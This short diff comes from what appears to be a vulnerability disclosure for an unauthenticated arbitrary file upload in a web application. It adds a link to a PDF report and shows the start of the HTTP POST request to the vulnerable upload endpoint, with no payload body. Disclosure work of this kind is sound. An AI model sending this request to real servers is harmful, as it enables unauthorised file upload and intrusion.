@@ -1,4 +1,6 @@
 Vulnerability Unauthorized arbitrary file upload (SYSTEM)
+https://github.com/Flash1201/bug/blob/main/Vulnerability%20Unauthorized%20arbitrary%20file%20upload%20(SYSTEM).pdf
+
 POST /index.php/Pan/Upload/upload/clientid/4.html?flag=input HTTP/1.1
 Host: 192.168.5.25:8000
 Content-Length: 1268
